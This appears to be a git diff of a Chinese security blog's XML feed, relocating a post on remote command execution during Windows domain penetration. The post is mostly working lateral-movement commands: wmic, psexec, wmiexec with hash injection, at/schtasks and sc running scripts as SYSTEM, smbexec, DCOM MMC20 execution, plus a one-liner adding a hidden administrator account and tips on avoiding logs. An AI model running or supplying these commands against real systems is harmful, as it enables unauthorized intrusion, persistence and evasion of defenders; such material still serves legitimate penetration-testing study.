+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">test.exe 192.168.17.138 test !@#123QWE &quot;whoami &#x2F;all&quot; c$</span><br></pre></td></tr></table></figure>
+<p>在远程系统上执行 bat 脚本(以管理员权限执行命令)</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">test.exe 192.168.17.138 Administrator !@#123QWE c:\programdata\test.bat ipc$</span><br></pre></td></tr></table></figure>
+<p>删除远程系统上的 execserver.exe</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">del \\192.168.17.138\c$\windows\execserver.exe</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x06-利用DCOM在远程系统执行程序"><a href="#0x06-利用DCOM在远程系统执行程序" class="headerlink" title="0x06 利用DCOM在远程系统执行程序"></a>0x06 利用DCOM在远程系统执行程序</h2><h3 id="DCOM使用介绍"><a href="#DCOM使用介绍" class="headerlink" title="DCOM使用介绍"></a>DCOM使用介绍</h3><h4 id="获得DCOM的程序列表"><a href="#获得DCOM的程序列表" class="headerlink" title="获得DCOM的程序列表"></a>获得DCOM的程序列表</h4><p>powershell命令</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Get-CimInstance Win32_DCOMApplication</span><br></pre></td></tr></table></figure>
+<p><img src="/posts/35747/1.png" alt></p>
+<p>注意：<br><code>Get-CimInstance</code> 只适用于Powershell 3.0及以上，Win7默认为2.0不支持，可使用以下替代命令：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_DCOMApplication</span><br></pre></td></tr></table></figure>
+<p>当然，直接使用wmic查询也可以，代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wmic &#x2F;NAMESPACE:&quot;\\root\CIMV2&quot; PATH Win32_DCOMApplication  GET &#x2F;all &#x2F;FORMAT:list</span><br></pre></td></tr></table></figure>
+<p>powershell对WMI的调用可使用wmic命令进行替换，详情可参考：</p>
+<p><a href="https://3gstudent.github.io/3gstudent.github.io/Study-Notes-of-WMI-Persistence-using-wmic.exe/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/Study-Notes-of-WMI-Persistence-using-wmic.exe/</a></p>
+<h4 id="对本机测试"><a href="#对本机测试" class="headerlink" title="对本机测试"></a>对本机测试</h4><p>管理员权限，powershell代码如下:<br>获得”MMC20.Application”支持的操作</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$com &#x3D; [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;127.0.0.1&quot;))</span><br><span class="line">$com.Document.ActiveView | Get-Member</span><br></pre></td></tr></table></figure>
+<p><img src="/posts/35747/2.png" alt></p>
+<p><strong>查看ExecuteShellCommand对应的参数说明</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$com.Document.ActiveView.ExecuteShellCommand</span><br></pre></td></tr></table></figure>
+<p><img src="/posts/35747/3.png" alt></p>
+<p>ExecuteShellCommand 对应的参数具体含义可参考以下链接：</p>
+<p><a href="https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx" target="_blank" rel="noopener">https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx</a></p>
+<p>通过ExecuteShellCommand执行程序</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$com &#x3D; [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;127.0.0.1&quot;))</span><br><span class="line">$com.Document.ActiveView.ExecuteShellCommand(&#39;cmd.exe&#39;,$null,&quot;&#x2F;c calc.exe&quot;,&quot;Minimized&quot;)</span><br></pre></td></tr></table></figure>
+<h4 id="对远程系统测试"><a href="#对远程系统测试" class="headerlink" title="对远程系统测试"></a>对远程系统测试</h4><p><strong>调用MMC20.Application</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$com &#x3D; [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;192.168.72.10&quot;))</span><br><span class="line">$com.Document.ActiveView.ExecuteShellCommand(&#39;cmd.exe&#39;,$null,&quot;&#x2F;c calc.exe&quot;,&quot;Minimized&quot;)</span><br></pre></td></tr></table></figure>
+<p><img src="/posts/35747/4.png" alt></p>
+<p>win7查看后台程序列表<br><img src="/posts/35747/5.png" alt></p>
+<p><strong>调用’9BA05972-F6A8-11CF-A442-00A0C90A8F39’</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$com &#x3D; [Type]::GetTypeFromCLSID(&#39;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#39;,&quot;192.168.0.2&quot;)</span><br><span class="line">$obj &#x3D; [System.Activator]::CreateInstance($com)</span><br><span class="line">$item &#x3D; $obj.item()</span><br><span class="line">$item.Document.Application.ShellExecute(&quot;cmd.exe&quot;,&quot;&#x2F;c calc.exe&quot;,&quot;c:\windows\system32&quot;,$null,0)</span><br></pre></td></tr></table></figure>
+<p><img src="/posts/35747/6.png" alt></p>
+<p><strong>注意：</strong></p>
+<p>以上两种方式适用于Win7-Win10</p>
+]]></content>
+      <tags>
+        <tag>域渗透</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>内网渗透基础总结</title>
     <url>/posts/44578.html</url>
     <content><![CDATA[<h2 id="0x00-内网"><a href="#0x00-内网" class="headerlink" title="0x00 内网"></a>0x00 内网</h2><p>局域网（Local Area Network，LAN）是指在某一区域内由多台计算机互联成的计算机组。一般是方圆几千米以内。局域网可以实现文件管理、应用软件共享、打印机共享、工作组内的日程安排、电子邮件和传真通信服务等功能。局域网是封闭型的，可以由办公室内的两台计算机组成，也可以由一个公司内的上千台计算机组成。</p>
@@ -4111,134 +4245,6 @@ string substr(string, start, length)
       </categories>
       <tags>
         <tag>SQL注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>域渗透远程执行命令的几种姿势</title>
-    <url>/posts/35747.html</url>
-    <content><![CDATA[<h1 id="域渗透远程执行命令的几种姿势"><a href="#域渗透远程执行命令的几种姿势" class="headerlink" title="域渗透远程执行命令的几种姿势"></a>域渗透远程执行命令的几种姿势</h1><h2 id="0x00-vmic"><a href="#0x00-vmic" class="headerlink" title="0x00 vmic"></a>0x00 vmic</h2><p>WMI 的全称是 Windows Management Instrumentation，它出现在所有的 Windows 操作系统中，并由一组强大的工具集合组成，用于管理本地或远程的 Windows 系统，攻击者使用 wmi 来进行攻击，但 Windows 系统默认不会在日志中记录这些操作，可以做到<strong>无日志</strong>，攻击脚本无需写入到磁盘，增加了隐蔽性。推荐使用 wmic 进行远程执行命令。</p>
-<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><ol>
-<li><p>在远程系统上执行 bat 脚本</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wmic &#x2F;node:192.168.72.10 &#x2F;user:administrator &#x2F;password:L111111! process call create c:\test.bat</span><br></pre></td></tr></table></figure></li>
-<li><p>在远程系统上执行单条命令</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wmic &#x2F;node:192.168.72.10 &#x2F;user:administrator &#x2F;password:L111111 process call create &quot;cmd.exe &#x2F;c net user test1 !@#123QWE &#x2F;add &amp;&amp; net localgroup administrators test1 &#x2F;add</span><br></pre></td></tr></table></figure>
-
-</li>
-</ol>
-<h3 id="工具说明"><a href="#工具说明" class="headerlink" title="工具说明"></a>工具说明</h3><ol>
-<li>需要远程系统启动 Windows Management Instrumentation 服务，开放135端口</li>
-<li>远程系统的本地安全策略的“网络访问: 本地帐户的共享和安全模式”应设为“经典-本地用户以自己的身份验证”</li>
-<li>wmic 会以管理员权限在远程系统上执行命令</li>
-<li>防火墙开启将无法连接</li>
-<li>如果报错 “Invalid Global Switch” ，用双引号把包含-的结点括起来即可正常执行。</li>
-</ol>
-<h2 id="0x01-psexec"><a href="#0x01-psexec" class="headerlink" title="0x01 psexec"></a>0x01 psexec</h2><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><p>psexec针对远程建立连接的认证方式有两种，一种先建立 ipc 连接，然后直接用 <code>psexec \\192.168.72.10 cmd</code> 命令开启一个半交互式的cmdshell，另一种是在psexec的参数中指定账号密码。</p>
-<p><img src="/posts/35747/11.png" alt></p>
-<p><img src="/posts/35747/12.png" alt></p>
-<h3 id="执行原理"><a href="#执行原理" class="headerlink" title="执行原理"></a>执行原理</h3><ol>
-<li>通过ipc连接，释放psexesvc.exe到目标</li>
-<li>通过服务管理SCManager远程创建psexecsvc服务，并启动服务</li>
-<li>客户端连接执行命令,服务端启动相应的程序并执行回显数据</li>
-</ol>
-<h3 id="工具说明-1"><a href="#工具说明-1" class="headerlink" title="工具说明"></a>工具说明</h3><p><strong>注意：</strong></p>
-<ol>
-<li>目标主机第一次运行时，会出现弹框提示。<br>解决办法：先执行 <code>psexec /accepteula</code> 即可避免。</li>
-<li>运行完之后记得删除服务。这个在日志中会有记录，而且在少数情况下会出现服务删除不成功！！！<br>所以一般不用它。</li>
-<li>需要远程系统开启 ADMIN$ 共享</li>
-<li>建立 ipc 连接后可以不指定用户名和密码</li>
-</ol>
-<h2 id="0x02-WMIEXEC"><a href="#0x02-WMIEXEC" class="headerlink" title="0x02 WMIEXEC"></a>0x02 WMIEXEC</h2><p>WMI 可以远程执行命令，大牛使用VBS脚本调用WMI来模拟 psexec 的功能，于是乎WMIEXEC 就诞生了。基本上psexec 能用的地方，这个脚本也能够使用。整个过程是先调用WMI通过账号密码或者NTLM认证（WCE注入）连接到远程计算机，然后如果提供了账号密码，则用这个账号密码建立一个到目标的IPC连接。随后WMI会建立一个共享文件夹，用于远程读取命令执行结果。 当用户输入命令时，WMI创建进程执行该命令，然后把结果输出到文件，这个文件位于之前创建的共享文件夹中。最后，通过FSO组件访问远程共享文件夹中的结果文件，将结果输出。当结果读取完成时，调用WMI执行命令删除结果文件。最后当WMIEXEC退出时，删除文件共享。<br><img src="/posts/35747/21.png" alt><br>WMIEXEC支持两种模式，一种是半交互式shell模式，另一种是执行单条命令模式。</p>
-<p>WMIEXEC需要提供账号密码进行远程连接，但是如果没有破解出账号密码，也可以配合WCE的hash注入功能一起使用，先进行hash注入，然后再使用WMIEXEC即可。</p>
-<p><strong>半交互式shell模式</strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cscript.exe &#x2F;&#x2F;nologo wmiexec.vbs &#x2F;shell IP username password</span><br></pre></td></tr></table></figure>
-<p><img src="/posts/35747/22.png" alt></p>
-<p><strong>单个命令执行的模式</strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cscript.exe wmiexec.vbs &#x2F;cmd IP username password &quot;command&quot;</span><br></pre></td></tr></table></figure>
-<p><img src="/posts/35747/23.png" alt></p>
-<h2 id="0x03-at-amp-schtasks计划任务"><a href="#0x03-at-amp-schtasks计划任务" class="headerlink" title="0x03 at&amp;schtasks计划任务"></a>0x03 at&amp;schtasks计划任务</h2><h3 id="net-use-at"><a href="#net-use-at" class="headerlink" title="net use + at"></a>net use + at</h3><p>建立ipc连接</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net use \\目标IP\ipc$ password &#x2F;user:username</span><br></pre></td></tr></table></figure>
-<p>拷贝文件到远程系统</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">copy 文件 \\目标IP\c$</span><br></pre></td></tr></table></figure>
-<p>查看远程主机当前时间</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net use \\目标IP</span><br></pre></td></tr></table></figure>
-<p>添加计划任务在远程系统上执行命令</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">at \\目标IP 时间 cmd.exe &#x2F;c &quot;ipconfig &#x2F;all &gt;c:ip.log&quot;</span><br></pre></td></tr></table></figure>
-<p>添加计划任务在远程系统上执行bat脚本</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">at \\目标IP 时间 c:test.bat</span><br></pre></td></tr></table></figure>
-<p>查看at任务列表</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">at \\目标IP</span><br></pre></td></tr></table></figure>
-<p>删除at计划任务，运行完成后一定要删除计划任务！</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">at \\目标IP 1 &#x2F;delete</span><br></pre></td></tr></table></figure>
-<p>查看所有ipc连接</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net use</span><br></pre></td></tr></table></figure>
-<p>删除指定ipc连接</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net use \\目标IP\ipc$ &#x2F;del</span><br></pre></td></tr></table></figure>
-<p>删除所有ipc连接（删除前记得确认是否都是自己测试中建立的连接）</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net use * &#x2F;del &#x2F;y</span><br></pre></td></tr></table></figure>
-
-<h3 id="schtasks"><a href="#schtasks" class="headerlink" title="schtasks"></a>schtasks</h3><h3 id="常用命令-1"><a href="#常用命令-1" class="headerlink" title="常用命令"></a>常用命令</h3><p>在远程系统建立计划任务(计划运行时会以 system 权限在远程系统上执行单条命令)</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">schtasks &#x2F;create &#x2F;s 192.168.17.138 &#x2F;u workgroup\administrator &#x2F;p &quot;!@#123QWE&quot; &#x2F;tn test &#x2F;sc onstart &#x2F;tr &quot;cmd.exe &#x2F;c netstat -ano | findstr 3389 &gt;&gt; c:\programdata\error.log&quot; &#x2F;ru system &#x2F;f</span><br></pre></td></tr></table></figure>
-<p>在远程系统建立计划任务(计划运行时会以 system 权限在远程系统上执行 bat 脚本)</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">schtasks &#x2F;create &#x2F;s 192.168.17.138 &#x2F;u workgroup\administrator &#x2F;p &quot;!@#123QWE&quot; &#x2F;tn test &#x2F;sc onstart &#x2F;tr c:\programdata\test.bat &#x2F;ru system &#x2F;f</span><br></pre></td></tr></table></figure>
-<p>在远程系统建立计划任务(计划运行时会以管理员权限在远程系统上执行单条命令),注：这条命令不支持 hash 注入后省去用户名密码执行</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">schtasks &#x2F;create &#x2F;s 192.168.17.138 &#x2F;u workgroup\administrator &#x2F;p &quot;!@#123QWE&quot; &#x2F;tn test &#x2F;sc onstart &#x2F;tr &quot;cmd.exe &#x2F;c whoami &#x2F;all &gt;&gt; c:\programdata\error.log&quot; &#x2F;ru  workgroup\administrator&quot;</span><br></pre></td></tr></table></figure>
-<p>查看建立的计划任务是否正确</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">schtasks &#x2F;query &#x2F;s 192.168.17.138 &#x2F;u workgroup\administrator &#x2F;p &quot;!@#123QWE&quot; | findstr test</span><br></pre></td></tr></table></figure>
-<p>运行建立的计划任务</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">schtasks &#x2F;run &#x2F;s 192.168.17.138 &#x2F;u workgroup\administrator &#x2F;p &quot;!@#123QWE&quot; &#x2F;i &#x2F;tn &quot;test&quot;</span><br></pre></td></tr></table></figure>
-<p>删除建立的计划任务</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">schtasks &#x2F;delete &#x2F;s 192.168.17.138 &#x2F;u workgroup\administrator &#x2F;p &quot;!@#123QWE&quot; &#x2F;tn &quot;test&quot; &#x2F;f</span><br></pre></td></tr></table></figure>
-<p>注意：<br>工具需要远程系统启动 Task Scheduler 服务，schtasks 不需要 RPC 服务的支持，在条件允许的情况下，尽量使用 schtasks，因为在某些条件下，at 执行完任务后，任务信息没有删除（需要手动删除），用at命令查不到任务信息，但是用 schtasks 却能看到任务信息，任务名是At加一个数字。</p>
-<h2 id="0x04-SC添加服务远程执行命令"><a href="#0x04-SC添加服务远程执行命令" class="headerlink" title="0x04 SC添加服务远程执行命令"></a>0x04 SC添加服务远程执行命令</h2><h3 id="常用命令-2"><a href="#常用命令-2" class="headerlink" title="常用命令"></a>常用命令</h3><p>建立 ipc 连接后，上传等待运行的 bat 脚本到目标系统上，创建服务（开启服务时会以system 权限在远程系统上执行 bat 脚本）</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sc \\192.168.17.138 create test binpath&#x3D; &quot;cmd.exe &#x2F;c start c:\programdata\test.bat&quot;</span><br></pre></td></tr></table></figure>
-<p>开启服务，运行其它命令可以直接修改 bat 脚本内容</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sc \\192.168.17.138 start test</span><br></pre></td></tr></table></figure>
-<p>删除服务</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sc \\192.168.17.138 delete test</span><br></pre></td></tr></table></figure>
-
-<h2 id="0x05-smbexec"><a href="#0x05-smbexec" class="headerlink" title="0x05 smbexec"></a>0x05 smbexec</h2><p>smbexec 是基于 psexec 修改的程序，加入了参数来指定默认共享，可以在目标为开启 admin$ 共享但开了其它共享时使用。</p>
-<h3 id="常用命令-3"><a href="#常用命令-3" class="headerlink" title="常用命令"></a>常用命令</h3><p>建立 ipc 连接后，上传 execserver.exe 到远程系统上</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">copy execserver.exe \\192.168.17.138\c$\windows</span><br></pre></td></tr></table></figure>
-<p>在远程系统上执行单条命令(以管理员权限执行命令)</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">test.exe 192.168.17.138 Administrator !@#123QWE &quot;whoami &#x2F;all&quot; c$</span><br></pre></td></tr></table></figure>
-<p>在远程系统上执行单条命令</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">test.exe 192.168.17.138 test !@#123QWE &quot;whoami &#x2F;all&quot; c$</span><br></pre></td></tr></table></figure>
-<p>在远程系统上执行 bat 脚本(以管理员权限执行命令)</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">test.exe 192.168.17.138 Administrator !@#123QWE c:\programdata\test.bat ipc$</span><br></pre></td></tr></table></figure>
-<p>删除远程系统上的 execserver.exe</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">del \\192.168.17.138\c$\windows\execserver.exe</span><br></pre></td></tr></table></figure>
-
-<h2 id="0x06-利用DCOM在远程系统执行程序"><a href="#0x06-利用DCOM在远程系统执行程序" class="headerlink" title="0x06 利用DCOM在远程系统执行程序"></a>0x06 利用DCOM在远程系统执行程序</h2><h3 id="DCOM使用介绍"><a href="#DCOM使用介绍" class="headerlink" title="DCOM使用介绍"></a>DCOM使用介绍</h3><h4 id="获得DCOM的程序列表"><a href="#获得DCOM的程序列表" class="headerlink" title="获得DCOM的程序列表"></a>获得DCOM的程序列表</h4><p>powershell命令</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Get-CimInstance Win32_DCOMApplication</span><br></pre></td></tr></table></figure>
-<p><img src="/posts/35747/1.png" alt></p>
-<p>注意：<br><code>Get-CimInstance</code> 只适用于Powershell 3.0及以上，Win7默认为2.0不支持，可使用以下替代命令：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_DCOMApplication</span><br></pre></td></tr></table></figure>
-<p>当然，直接使用wmic查询也可以，代码如下：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wmic &#x2F;NAMESPACE:&quot;\\root\CIMV2&quot; PATH Win32_DCOMApplication  GET &#x2F;all &#x2F;FORMAT:list</span><br></pre></td></tr></table></figure>
-<p>powershell对WMI的调用可使用wmic命令进行替换，详情可参考：</p>
-<p><a href="https://3gstudent.github.io/3gstudent.github.io/Study-Notes-of-WMI-Persistence-using-wmic.exe/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/Study-Notes-of-WMI-Persistence-using-wmic.exe/</a></p>
-<h4 id="对本机测试"><a href="#对本机测试" class="headerlink" title="对本机测试"></a>对本机测试</h4><p>管理员权限，powershell代码如下:<br>获得”MMC20.Application”支持的操作</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$com &#x3D; [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;127.0.0.1&quot;))</span><br><span class="line">$com.Document.ActiveView | Get-Member</span><br></pre></td></tr></table></figure>
-<p><img src="/posts/35747/2.png" alt></p>
-<p><strong>查看ExecuteShellCommand对应的参数说明</strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$com.Document.ActiveView.ExecuteShellCommand</span><br></pre></td></tr></table></figure>
-<p><img src="/posts/35747/3.png" alt></p>
-<p>ExecuteShellCommand 对应的参数具体含义可参考以下链接：</p>
-<p><a href="https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx" target="_blank" rel="noopener">https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx</a></p>
-<p>通过ExecuteShellCommand执行程序</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$com &#x3D; [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;127.0.0.1&quot;))</span><br><span class="line">$com.Document.ActiveView.ExecuteShellCommand(&#39;cmd.exe&#39;,$null,&quot;&#x2F;c calc.exe&quot;,&quot;Minimized&quot;)</span><br></pre></td></tr></table></figure>
-<h4 id="对远程系统测试"><a href="#对远程系统测试" class="headerlink" title="对远程系统测试"></a>对远程系统测试</h4><p><strong>调用MMC20.Application</strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$com &#x3D; [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;192.168.72.10&quot;))</span><br><span class="line">$com.Document.ActiveView.ExecuteShellCommand(&#39;cmd.exe&#39;,$null,&quot;&#x2F;c calc.exe&quot;,&quot;Minimized&quot;)</span><br></pre></td></tr></table></figure>
-<p><img src="/posts/35747/4.png" alt></p>
-<p>win7查看后台程序列表<br><img src="/posts/35747/5.png" alt></p>
-<p><strong>调用’9BA05972-F6A8-11CF-A442-00A0C90A8F39’</strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$com &#x3D; [Type]::GetTypeFromCLSID(&#39;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#39;,&quot;192.168.0.2&quot;)</span><br><span class="line">$obj &#x3D; [System.Activator]::CreateInstance($com)</span><br><span class="line">$item &#x3D; $obj.item()</span><br><span class="line">$item.Document.Application.ShellExecute(&quot;cmd.exe&quot;,&quot;&#x2F;c calc.exe&quot;,&quot;c:\windows\system32&quot;,$null,0)</span><br></pre></td></tr></table></figure>
-<p><img src="/posts/35747/6.png" alt></p>
-<p><strong>注意：</strong></p>
-<p>以上两种方式适用于Win7-Win10</p>
-]]></content>
-      <tags>
-        <tag>域渗透</tag>
       </tags>
   </entry>
   <entry>
